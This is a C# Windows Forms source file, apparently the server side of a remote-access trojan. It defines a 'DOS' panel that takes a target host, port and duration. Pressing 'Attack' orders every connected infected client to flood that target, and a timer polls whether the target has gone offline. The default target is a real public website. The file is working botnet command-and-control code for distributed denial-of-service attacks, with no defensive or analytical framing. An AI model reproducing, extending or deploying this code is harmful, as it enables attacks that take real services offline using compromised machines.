using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms;

public class FormDOS : Form
{
	private TimeSpan timespan;

	private Stopwatch stopwatch;

	private string status = "is online";

	public object sync = new object();

	public List<Clients> selectedClients = new List<Clients>();

	public List<Clients> PlguinClients = new List<Clients>();

	private IContainer components;

	private GroupBox groupBox1;

	private Label label2;

	private Label label1;

	private TextBox txtPort;

	private TextBox txtHost;

	private GroupBox groupBox2;

	private Label label4;

	private Label label3;

	private TextBox txtTimeout;

	private GroupBox groupBox3;

	private Button btnStop;

	private Button btnAttack;

	private System.Windows.Forms.Timer timer1;

	private System.Windows.Forms.Timer timer2;

	public FormDOS()
	{
		InitializeComponent();
	}

	private void BtnAttack_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtTimeout.Text))
		{
			return;
		}
		try
		{
			if (!txtHost.Text.ToLower().StartsWith("http://"))
			{
				txtHost.Text = "http://" + txtHost.Text;
			}
			new Uri(txtHost.Text);
		}
		catch
		{
			return;
		}
		if (PlguinClients.Count <= 0)
		{
			return;
		}
		try
		{
			btnAttack.Enabled = false;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "dos";
			msgPack.ForcePathObject("Option").AsString = "postStart";
			msgPack.ForcePathObject("Host").AsString = txtHost.Text;
			msgPack.ForcePathObject("Port").AsString = txtPort.Text;
			msgPack.ForcePathObject("Timeout").AsString = txtTimeout.Text;
			foreach (Clients plguinClient in PlguinClients)
			{
				selectedClients.Add(plguinClient);
				ThreadPool.QueueUserWorkItem(plguinClient.Send, msgPack.Encode2Bytes());
			}
			btnStop.Enabled = true;
			timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
			stopwatch = new Stopwatch();
			stopwatch.Start();
			timer1.Start();
			timer2.Start();
		}
		catch
		{
		}
	}

	private void BtnStop_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "dos";
			msgPack.ForcePathObject("Option").AsString = "postStop";
			foreach (Clients plguinClient in PlguinClients)
			{
				ThreadPool.QueueUserWorkItem(plguinClient.Send, msgPack.Encode2Bytes());
			}
			selectedClients.Clear();
			btnAttack.Enabled = true;
			btnStop.Enabled = false;
			timer1.Stop();
			timer2.Stop();
			status = "is online";
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Text = $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
		if (timespan < stopwatch.Elapsed)
		{
			btnAttack.Enabled = true;
			btnStop.Enabled = false;
			timer1.Stop();
			timer2.Stop();
			status = "is online";
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			WebRequest.Create(new Uri(txtHost.Text)).GetResponse().Dispose();
			status = "is online";
		}
		catch
		{
			status = "is offline";
		}
	}

	private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			foreach (Clients plguinClient in PlguinClients)
			{
				plguinClient.Disconnected();
			}
			PlguinClients.Clear();
			selectedClients.Clear();
		}
		catch
		{
		}
		Hide();
		base.Parent = null;
		e.Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormDOS));
		this.groupBox1 = new System.Windows.Forms.GroupBox();
		this.label2 = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.txtPort = new System.Windows.Forms.TextBox();
		this.txtHost = new System.Windows.Forms.TextBox();
		this.groupBox2 = new System.Windows.Forms.GroupBox();
		this.label4 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.txtTimeout = new System.Windows.Forms.TextBox();
		this.groupBox3 = new System.Windows.Forms.GroupBox();
		this.btnStop = new System.Windows.Forms.Button();
		this.btnAttack = new System.Windows.Forms.Button();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.timer2 = new System.Windows.Forms.Timer(this.components);
		this.groupBox1.SuspendLayout();
		this.groupBox2.SuspendLayout();
		this.groupBox3.SuspendLayout();
		base.SuspendLayout();
		this.groupBox1.Controls.Add(this.label2);
		this.groupBox1.Controls.Add(this.label1);
		this.groupBox1.Controls.Add(this.txtPort);
		this.groupBox1.Controls.Add(this.txtHost);
		this.groupBox1.Location = new System.Drawing.Point(12, 12);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(596, 114);
		this.groupBox1.TabIndex = 0;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Target";
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(415, 47);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(52, 20);
		this.label2.TabIndex = 2;
		this.label2.Text = "PORT";
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(17, 47);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(53, 20);
		this.label1.TabIndex = 2;
		this.label1.Text = "HOST";
		this.txtPort.Location = new System.Drawing.Point(477, 44);
		this.txtPort.Name = "txtPort";
		this.txtPort.Size = new System.Drawing.Size(70, 26);
		this.txtPort.TabIndex = 1;
		this.txtPort.Text = "80";
		this.txtHost.Location = new System.Drawing.Point(79, 44);
		this.txtHost.Name = "txtHost";
		this.txtHost.Size = new System.Drawing.Size(293, 26);
		this.txtHost.TabIndex = 1;
		this.txtHost.Text = "www.google.com";
		this.groupBox2.Controls.Add(this.label4);
		this.groupBox2.Controls.Add(this.label3);
		this.groupBox2.Controls.Add(this.txtTimeout);
		this.groupBox2.Location = new System.Drawing.Point(12, 146);
		this.groupBox2.Name = "groupBox2";
		this.groupBox2.Size = new System.Drawing.Size(596, 102);
		this.groupBox2.TabIndex = 1;
		this.groupBox2.TabStop = false;
		this.groupBox2.Text = "Settings";
		this.label4.AutoSize = true;
		this.label4.Location = new System.Drawing.Point(178, 45);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(38, 20);
		this.label4.TabIndex = 5;
		this.label4.Text = "min.";
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(18, 45);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(80, 20);
		this.label3.TabIndex = 4;
		this.label3.Text = "TIMEOUT";
		this.txtTimeout.Location = new System.Drawing.Point(109, 42);
		this.txtTimeout.Name = "txtTimeout";
		this.txtTimeout.Size = new System.Drawing.Size(63, 26);
		this.txtTimeout.TabIndex = 3;
		this.txtTimeout.Text = "5";
		this.groupBox3.Controls.Add(this.btnStop);
		this.groupBox3.Controls.Add(this.btnAttack);
		this.groupBox3.Location = new System.Drawing.Point(12, 282);
		this.groupBox3.Name = "groupBox3";
		this.groupBox3.Size = new System.Drawing.Size(596, 100);
		this.groupBox3.TabIndex = 2;
		this.groupBox3.TabStop = false;
		this.groupBox3.Text = "Command";
		this.btnStop.Enabled = false;
		this.btnStop.Location = new System.Drawing.Point(477, 35);
		this.btnStop.Name = "btnStop";
		this.btnStop.Size = new System.Drawing.Size(107, 43);
		this.btnStop.TabIndex = 1;
		this.btnStop.Text = "Stop";
		this.btnStop.UseVisualStyleBackColor = true;
		this.btnStop.Click += new System.EventHandler(BtnStop_Click);
		this.btnAttack.Location = new System.Drawing.Point(22, 35);
		this.btnAttack.Name = "btnAttack";
		this.btnAttack.Size = new System.Drawing.Size(107, 43);
		this.btnAttack.TabIndex = 0;
		this.btnAttack.Text = "Attack";
		this.btnAttack.UseVisualStyleBackColor = true;
		this.btnAttack.Click += new System.EventHandler(BtnAttack_Click);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.timer2.Interval = 5000;
		this.timer2.Tick += new System.EventHandler(Timer2_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(631, 408);
		base.Controls.Add(this.groupBox3);
		base.Controls.Add(this.groupBox2);
		base.Controls.Add(this.groupBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormDOS";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "DOS";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormDOS_FormClosing);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		this.groupBox2.ResumeLayout(false);
		this.groupBox2.PerformLayout();
		this.groupBox3.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
